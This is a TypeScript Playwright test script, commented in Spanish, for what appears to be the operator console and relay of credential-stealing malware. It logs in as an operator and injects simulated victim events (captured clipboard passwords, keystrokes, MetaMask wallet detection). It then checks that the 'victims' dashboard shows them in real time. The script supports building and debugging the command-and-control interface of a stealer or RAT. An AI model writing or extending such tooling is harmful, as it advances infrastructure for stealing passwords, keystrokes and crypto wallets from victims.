// Reproducción tareas 1 y 2 contra el relay real.
// Requiere tests/lab-agent.ts escuchando en 127.0.0.1:4599.
// Uso: npx tsx tests/repro-timeline.ts <before|after>
import { chromium } from 'playwright-core';
import { authenticator } from 'otplib';
import { PrismaClient } from '@prisma/client';

const prisma = new PrismaClient();
const UI = 'http://127.0.0.1:3001';

async function send(kind: string, data: Record<string, unknown>, legacy = '') {
  const res = await fetch('http://127.0.0.1:4599', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ kind, data, legacy }) });
  return res.ok;
}

async function main() {
  const mode = process.argv[2] ?? 'before';
  const admin = await prisma.operator.findUniqueOrThrow({ where: { email: 'admin@spc.local' } });
  const victim = await prisma.victim.findFirstOrThrow({ where: { hostname: 'SEED-DESKTOP' } });
  const login = await fetch('http://127.0.0.1:4000/api/console/auth/login', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email: 'admin@spc.local', password: 'screenshot-pass', totp: authenticator.generate(admin.totpSecret) })
  });
  if (!login.ok) throw new Error(await login.text());
  const cookie = login.headers.get('set-cookie')!.split(';')[0]!;

  const browser = await chromium.launch({ executablePath: '/usr/bin/chromium-browser', headless: true });
  const context = await browser.newContext({ viewport: { width: 1500, height: 950 } });
  const [name, value] = cookie.split('=');
  await context.addCookies([{ name: name!, value: value!, url: UI }]);
  const page = await context.newPage();
  const frames: Array<{ type: string; kind?: string }> = [];
  page.on('websocket', (socket) => {
    socket.on('framereceived', (frame) => {
      try {
        const parsed = JSON.parse(String(frame.payload)) as { type: string; data?: Record<string, unknown> };
        if (parsed.type === 'event.new') frames.push({ type: parsed.type, kind: String(parsed.data?.kind ?? '') });
      } catch { /* ignore */ }
    });
  });

  const stamp = Date.now();
  const markers = { clipboard: `repro-clip-${stamp}`, wallet: `repro-wallet-${stamp}`, keystroke: `repro-key-${stamp}` };

  // --- Tarea 2: detección de wallet por el camino bridge (fila sin publish).
  await page.goto(`${UI}/victims?select=${victim.id}`, { waitUntil: 'networkidle' });
  await page.waitForTimeout(700);
  await page.screenshot({ path: `../docs/ui/repro-${mode}-wallet-before.png` });
  await prisma.event.create({ data: { victimId: victim.id, kind: 'wallet_detected', data: { text: `wallet detected: metamask (${(stamp % 30000) + 100})` } } });
  await page.waitForTimeout(2500);
  const wallet2s = await page.getByText(/metamask ·/i).count();
  await page.screenshot({ path: `../docs/ui/repro-${mode}-wallet-2s.png` });
  await page.waitForTimeout(15_000);
  const wallet17s = await page.getByText(/metamask ·/i).count();

  // --- Tarea 1: portapapeles y teclas.
  await page.goto(`${UI}/victims?select=${victim.id}&tab=actividad`, { waitUntil: 'networkidle' });
  await page.waitForTimeout(400);
  const clipTab = page.getByRole('button', { name: 'Portapapeles', exact: true });
  if (await clipTab.count()) await clipTab.click();
  await page.waitForTimeout(300);
  await page.screenshot({ path: `../docs/ui/repro-${mode}-clip-before.png` });

  const secretSent = await send('clipboard_secret', { kind: 'password', value: markers.clipboard, process: 'Notepad.exe', title: 'repro.txt - Notepad' }, `password? Notepad.exe | repro.txt | ${markers.clipboard}`);
  await page.waitForTimeout(2500);
  const clipboardVisible = await page.locator(`text=${markers.clipboard}`).count();
  await page.screenshot({ path: `../docs/ui/repro-${mode}-clip-after.png` });

  // Eventos genéricos: antes del arreglo el relay los rechaza y cierra el socket.
  const genericClip = await send('clipboard', { content: `clipboard-texto-${stamp}`, process: 'Notepad.exe', title: 'repro.txt' });
  const genericKey = await send('keystroke', { text: markers.keystroke, process: 'Notepad.exe', title: 'repro.txt' });
  await page.waitForTimeout(1500);
  const keystrokeVisible = await page.locator(`text=${markers.keystroke}`).count();
  await page.screenshot({ path: `../docs/ui/repro-${mode}-final.png` });

  console.log(JSON.stringify({
    victim: victim.id,
    accepted: { clipboard_secret: secretSent, clipboard: genericClip, keystroke: genericKey },
    wsEventNewKinds: frames.map((frame) => frame.kind),
    walletBadgeLiveIn2s: wallet2s > 0,
    walletBadgeAfterPollIn17s: wallet17s > 0,
    clipboardVisibleIn2s: clipboardVisible > 0,
    keystrokeVisibleIn2s: keystrokeVisible > 0,
    markers
  }, null, 2));

  await browser.close();
  await prisma.$disconnect();
}

main().catch((error) => { console.error(error); process.exit(1); });
